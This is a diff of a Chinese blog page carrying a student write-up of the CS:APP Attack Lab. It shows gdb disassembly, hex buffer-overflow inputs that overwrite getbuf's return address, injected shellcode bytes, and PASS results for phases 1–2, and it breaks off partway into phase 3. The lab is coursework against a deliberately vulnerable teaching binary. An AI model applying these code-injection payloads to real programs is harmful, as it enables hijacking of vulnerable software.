@@ -1,388 +1,854 @@
 <!DOCTYPE html>
-<html>
-  <head><meta name="generator" content="Hexo 3.8.0">
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-    <meta name="theme-color" content="#33363b">
-    <meta name="msapplication-TileColor" content="#33363b">
-    
-    
-    
-    
-    <meta name="keywords" content="Life, ARIA, Hexo">
-    
-    
-    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
-    
-    
-    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
-    
-    
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
-    
-    
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
-    
-    
-    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
-    
-    
-    <link rel="manifest" href="/favicons/site.webmanifest">
-    
-    
-    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
-    
-    
-    <link rel="alternate" href="/atom.xml" title="OneStep" type="application/atom+xml">
-    
-    
-    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
-    
-    
-    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
-    <link rel="stylesheet" type="text/css" href="/css/index.css">
-    
-    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
-    
-    
-<link rel="stylesheet" type="text/css" href="/css/page.css">
-<link rel="stylesheet" type="text/css" href="/css/post.css">
 
-    <link rel="stylesheet" type="text/css" href="/css/custom.css">
-    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
-    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
-    <script type="text/javascript" src="/js/jquery.min.js"></script>
-    <script defer type="text/javascript" src="/js/util.js"></script>
-    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
-    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
-    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
-    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
-    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
-    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
-    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
-    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh_CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CS:APP,汇编,代码注入攻击,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="OneStep" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="实验描述">
+<meta name="keywords" content="CS:APP,汇编,代码注入攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attack_lab">
+<meta property="og:url" content="https://Jason210314.github.io/2018/12/08/Attack-lab/index.html">
+<meta property="og:site_name" content="OneStep">
+<meta property="og:description" content="实验描述">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:updated_time" content="2018-12-09T08:22:16.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Attack_lab">
+<meta name="twitter:description" content="实验描述">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://Jason210314.github.io/2018/12/08/Attack-lab/">
+
+
+
+
+
+  <title>Attack_lab | OneStep</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh_CN">
+
+  
+  
     
-    <script defer src="/js/busuanzi.pure.mini.js"></script>
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
     
-    
-    <script defer type="text/javascript" src="/js/search.js"></script>
-    <script type="text/javascript">
-    $(document).ready(function () {
-      var searchPath = "search.xml";
-      if (searchPath.length === 0) {
-        searchPath = "search.xml";
-      }
-      var path = "/" + searchPath;
-      searchFunc(path, "search-input", "search-result");
-    });
-    </script>
-    
-    
-    
-    
-    <script defer type="text/javascript" src="/js/index.js"></script>
-    
-    <script defer type="text/javascript" src="/js/custom.js"></script>
-    <title>Attack_lab | OneStep</title>
-  </head>
-  <body itemscope="" itemtype="http://schema.org/WebPage" lang="zh_CN" data-spy="scroll" data-target=".list-group">
-    
-<header id="header" class="header" style="background: #33363b;">
-  <div class="container">
-    <div class="header-container">
-      <div class="header-title">
-        <h1 class="title"><a href="/">OneStep</a></h1>
-        <h2 class="subtitle"></h2>
-      </div>
-      
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">OneStep</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
     </div>
-    <nav id="nav" class="nav">
-      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
-      <ul id="menu" role="menubar" aria-hidden="false">
-        
-        <li role="menuitem"><a href="/">首页</a></li>
-        
-        <li role="menuitem"><a href="/archives/">归档</a></li>
-        
-        <li role="menuitem"><a href="/categories/">分类</a></li>
-        
-        <li role="menuitem"><a href="/tags/">标签</a></li>
-        
-        <li role="menuitem"><a href="/about/">关于</a></li>
-        
-      </ul>
-    </nav>
+      
+        <p class="site-subtitle"></p>
+      
   </div>
-</header>
 
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
 
     <main id="main" class="main">
-      <div class="container">
-        <div class="main-container">
-          <div class="content">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
             
-<div id="post" class="page">
+
+  <div id="posts" class="posts-expand">
+    
+
   
-  <article class="article post card" itemscope="" itemtype="http://schema.org/Article">
-    <div class="post-block">
-      <link itemprop="mainEntityOfPage" href="https://Jason210314.github.io/2018/12/08/Attack-lab/">
-      <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-       <meta itemprop="name" content="Wmc">
-       <meta itemprop="description" content="">
-       <meta itemprop="image" content="/images/head.jpeg">
-      </span>
-      <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-       <meta itemprop="name" content="OneStep">
-      </span>
-    </div>
-    <header class="post-header">
-      <h1 class="post-title" itemprop="name headline">Attack_lab</h1>
-      <div class="post-meta">
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://Jason210314.github.io/2018/12/08/Attack-lab/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wmc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneStep">
+    </span>
+
+    
+      <header class="post-header">
+
         
-        <span class="post-date">
-          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2018-12-08T17:49:57+08:00">2018-12-08 17:49:57</time></span>
-        </span>
         
+          <h1 class="post-title" itemprop="name headline">Attack_lab</h1>
         
-        
-        <span class="post-meta-divider divider">|</span>
-        
-        <span class="post-categories">
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-08T17:49:57+08:00">
+                2018-12-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
           
-          <i class="far fa-folder-open"></i><span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CS-APP/" itemprop="url" rel="index"><span itemprop="name">CS:APP</span></a></span>
-        </span>
-        
-        
-      </div>
-    </header>
-    <main class="post-main" itemprop="articleBody">
-      <h3 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h3><a id="more"></a>
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/CS-APP/" itemprop="url" rel="index">
+                    <span itemprop="name">CS:APP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h3><a id="more"></a>
 <p>本次实验利用程序需要外部输入的特点，输入机器码对程序返回值覆盖，以达到攻击的目的，即在getbuf函数需要的输入中做手脚，以致不能正常返回，执行攻击代码。</p>
 <h4 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h4><p>第一阶段中栈随机化未开机，可以得知内存位置的确切地址，且栈中机器码可执行。</p>
 <p>那么我们将需要执行的操作码和地址输入机器码即可。</p>
 <h4 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h4><p>第一关非常简单，题目主要我们在getbuf执行完成后执行touch1,touch1()无参。</p>
-<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) disas getbuf <br>Dump of assembler code for function getbuf:<br>   0x0000000000401688 &lt;+0&gt;:	sub    $0x18,%rsp<br>   0x000000000040168c &lt;+4&gt;:	mov    %rsp,%rdi<br>   0x000000000040168f &lt;+7&gt;:	callq  0x4018ca &lt;Gets&gt;<br>   0x0000000000401694 &lt;+12&gt;:	mov    $0x1,%eax<br>   0x0000000000401699 &lt;+17&gt;:	add    $0x18,%rsp<br>   0x000000000040169d &lt;+21&gt;:	retq   <br>End of assembler dump.<br>(gdb) disas touch1<br>Dump of assembler code for function touch1:<br>   0x00000000004016a0 &lt;+0&gt;:	sub    $0x8,%rsp<br>   0x00000000004016a4 &lt;+4&gt;:	movl   $0x1,0x2029ee(%rip)        # 0x60409c &lt;vlevel&gt;<br>   0x00000000004016ae &lt;+14&gt;:	mov    $0x402e4e,%edi<br>   0x00000000004016b3 &lt;+19&gt;:	callq  0x400bd0 &lt;puts@plt&gt;<br>   0x00000000004016b8 &lt;+24&gt;:	mov    $0x1,%edi<br>   0x00000000004016bd &lt;+29&gt;:	callq  0x401ab5 &lt;validate&gt;<br>   0x00000000004016c2 &lt;+34&gt;:	mov    $0x0,%edi<br>   0x00000000004016c7 &lt;+39&gt;:	callq  0x400d60 &lt;exit@plt&gt;<br>End of assembler dump.<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) disas getbuf <br>Dump of assembler code for function getbuf:<br>   0x0000000000401688 &lt;+0&gt;:	sub    $0x18,%rsp<br>   0x000000000040168c &lt;+4&gt;:	mov    %rsp,%rdi<br>   0x000000000040168f &lt;+7&gt;:	callq  0x4018ca &lt;Gets&gt;<br>   0x0000000000401694 &lt;+12&gt;:	mov    $0x1,%eax<br>   0x0000000000401699 &lt;+17&gt;:	add    $0x18,%rsp<br>   0x000000000040169d &lt;+21&gt;:	retq   <br>End of assembler dump.<br>(gdb) disas touch1<br>Dump of assembler code for function touch1:<br>   0x00000000004016a0 &lt;+0&gt;:	sub    $0x8,%rsp<br>   0x00000000004016a4 &lt;+4&gt;:	movl   $0x1,0x2029ee(%rip)        # 0x60409c &lt;vlevel&gt;<br>   0x00000000004016ae &lt;+14&gt;:	mov    $0x402e4e,%edi<br>   0x00000000004016b3 &lt;+19&gt;:	callq  0x400bd0 &lt;puts@plt&gt;<br>   0x00000000004016b8 &lt;+24&gt;:	mov    $0x1,%edi<br>   0x00000000004016bd &lt;+29&gt;:	callq  0x401ab5 &lt;validate&gt;<br>   0x00000000004016c2 &lt;+34&gt;:	mov    $0x0,%edi<br>   0x00000000004016c7 &lt;+39&gt;:	callq  0x400d60 &lt;exit@plt&gt;<br>End of assembler dump.<br></code></pre></td></tr></table></figure>
 <p>可以看到，getbuf开出了0x18，即24字节的空间，touch1的地址为0x4016a0。那么我们只需填满这0x28空间，再以touch1地址替代返回值。注意：x86-64机器中，采用小端法，其低位字节存放在低地址，故我们输入数据时，先输入低位。</p>
-<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>a0 16 40 00 00 00 00 00<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>a0 16 40 00 00 00 00 00<br></code></pre></td></tr></table></figure>
 <p>转换后输入即可</p>
-<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Cookie: 0x63149380<br>Type string:Touch1!: You called touch1()<br>Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget<br>PASS: Would have posted the following:<br>	user id	2017211523<br>	course	f18<br>	lab	attacklab<br>	result	117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Cookie: 0x63149380<br>Type string:Touch1!: You called touch1()<br>Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget<br>PASS: Would have posted the following:<br>	user id	2017211523<br>	course	f18<br>	lab	attacklab<br>	result	117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00<br></code></pre></td></tr></table></figure>
 <h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h4><p>第二关根据题意，需要调用touch2，需要传递一个无符号整数值，其值为cookie，查看cookie文件，如下。</p>
-<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ cat cookie.txt <br>0x63149380<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ cat cookie.txt <br>0x63149380<br></code></pre></td></tr></table></figure>
 <p>为了给touch2传参，我们需要将cookie值赋给%rdi，然后将touch2地址压栈，使用ret弹出touch2地址返回，调用touch2。</p>
-<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov     $0x63149380,%rdi<br>pushq   $0x4016cc<br>ret<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov     $0x63149380,%rdi<br>pushq   $0x4016cc<br>ret<br></code></pre></td></tr></table></figure>
 <p>将其编译为二进制之后在反汇编，得到如下，由此我们便知指令的机器码是多少。</p>
-<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">phase2.o:     file format elf64-x86-64<br><br><br>Disassembly of section .text:<br><br>0000000000000000 &lt;.text&gt;:<br>   0:   48 c7 c7 80 93 14 63    mov    $0x63149380,%rdi<br>   7:   68 cc 16 40 00          pushq  $0x4016cc<br>   c:   c3                      retq<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">phase2.o:     file format elf64-x86-64<br><br><br>Disassembly of section .text:<br><br>0000000000000000 &lt;.text&gt;:<br>   0:   48 c7 c7 80 93 14 63    mov    $0x63149380,%rdi<br>   7:   68 cc 16 40 00          pushq  $0x4016cc<br>   c:   c3                      retq<br></code></pre></td></tr></table></figure>
 <p>我们将指令的机器码放在getbuf时的栈顶，然后将返回值位置设置为栈顶地址，这样既可达到目的，调用getbuf时栈顶地址为0x5566f7a8。</p>
-<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">48 c7 c7 80 93 14 63 68<br>cc 16 40 00 c3 00 00 00<br>00 00 00 00 00 00 00 00<br>a8 f7 66 55 00 00 00 00<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">48 c7 c7 80 93 14 63 68<br>cc 16 40 00 c3 00 00 00<br>00 00 00 00 00 00 00 00<br>a8 f7 66 55 00 00 00 00<br></code></pre></td></tr></table></figure>
 <p>输入运行。</p>
-<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase2 | ./ctarget -q<br>Cookie: 0x63149380<br>Type string:Touch2!: You called touch2(0x63149380)<br>Valid solution <span class="hljs-keyword">for</span> level 2 with target ctarget<br>PASS: Would have posted the following:<br>	user id	2017211523<br>	course	f18<br>	lab	attacklab<br>	result	117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase2 | ./ctarget -q<br>Cookie: 0x63149380<br>Type string:Touch2!: You called touch2(0x63149380)<br>Valid solution <span class="hljs-keyword">for</span> level 2 with target ctarget<br>PASS: Would have posted the following:<br>	user id	2017211523<br>	course	f18<br>	lab	attacklab<br>	result	117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00<br></code></pre></td></tr></table></figure>
 <h4 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h4><p>查看touch3</p>
-<figure class="hljs highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">touch3</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *sval)</span><br></span>&#123;<br>	vlevel = <span class="hljs-number">3</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br>	<span class="hljs-keyword">if</span> (hexmatch(cookie, sval)) &#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);<br>	validate(<span class="hljs-number">3</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);<br>	fail(<span class="hljs-number">3</span>);<br>&#125;<br>	<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">touch3</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *sval)</span><br></span>&#123;<br>	vlevel = <span class="hljs-number">3</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br>	<span class="hljs-keyword">if</span> (hexmatch(cookie, sval)) &#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);<br>	validate(<span class="hljs-number">3</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);<br>	fail(<span class="hljs-number">3</span>);<br>&#125;<br>	<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>可知其需要一个指向字符的指针sval，然后调用hexmatch，将cookie和sval作为参数传入，需要hexomatch返回非零值。</p>
-<figure class="hljs highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hexmatch</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> val, <span class="hljs-keyword">char</span> *sval)</span><br></span>&#123;<br>    <span class="hljs-keyword">char</span> cbuf[<span class="hljs-number">110</span>];<br>    <span class="hljs-comment">/* Make position of check string unpredictable */</span><br>    <span class="hljs-keyword">char</span> *s = cbuf + random() % <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">"%.8x"</span>, val);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(sval, s, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hexmatch</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> val, <span class="hljs-keyword">char</span> *sval)</span><br></span>&#123;<br>    <span class="hljs-keyword">char</span> cbuf[<span class="hljs-number">110</span>];<br>    <span class="hljs-comment">/* Make position of check string unpredictable */</span><br>    <span class="hljs-keyword">char</span> *s = cbuf + random() % <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">"%.8x"</span>, val);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(sval, s, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>由hexmatch可知，其比较cookie的字符串表示与传入的字符串是否相等，相等则返回1，那么问题明了，我们需要将表示cookie的字符串地址传给touch3，与第二题不同的是字符串需要有空间保存，我们需要在栈中找出调用hexmatch时候未被重写改变的空间，借以保存字符串。</p>
-<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov     $0x5566f7c8,%rdi<br>pushq   $0x4017a0<br>ret<br></code></pre></td></tr></table></figure>
